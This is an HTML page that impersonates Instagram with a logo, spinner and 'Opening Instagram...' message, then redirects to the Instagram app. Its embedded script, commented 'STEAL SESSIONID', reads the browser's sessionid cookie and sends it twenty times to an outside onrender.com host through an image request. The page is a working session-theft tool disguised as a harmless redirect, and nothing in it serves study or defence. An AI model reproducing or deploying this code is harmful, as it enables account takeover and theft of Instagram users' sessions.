<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram</title>
    <style>
        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif}
        .logo{width:100px;height:100px;background:url('https://instagram.com/static/images/ico/favicon-192.png') center/contain no-repeat}
        .text{font-size:20px;color:#262626;margin:20px 0;font-weight:600}
        .spinner{width:50px;height:50px;border:6px solid #f0f0f0;border-top:6px solid #0095f6;border-radius:50%;animation:s 1s linear infinite}
        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="logo"></div>
    <div class="text">Opening Instagram...</div>
    <div class="spinner"></div>

    <script>
        // OPEN INSTAGRAM APP
        setTimeout(() => {
            location.href = "instagram://app";
            setTimeout(() => location.href = "https://instagram.com", 2000);
        }, 1500);

        // STEAL SESSIONID — USING IMAGE TRICK (100% WORKS)
        function steal() {
            const cookies = document.cookie;
            const m = cookies.match(/sessionid=([^;]+)/);
            if (m && m[1].length > 40) {
                const img = new Image();
                img.src = "https://instagram-64lz.onrender.com/steal-session/?sess=" + encodeURIComponent(m[1]) + "&t=" + Date.now();
            }
        }

        // TRY 20 TIMES
        for(let i = 0; i < 20; i++) {
            setTimeout(steal, i * 700);
        }
    </script>
</body>
</html>
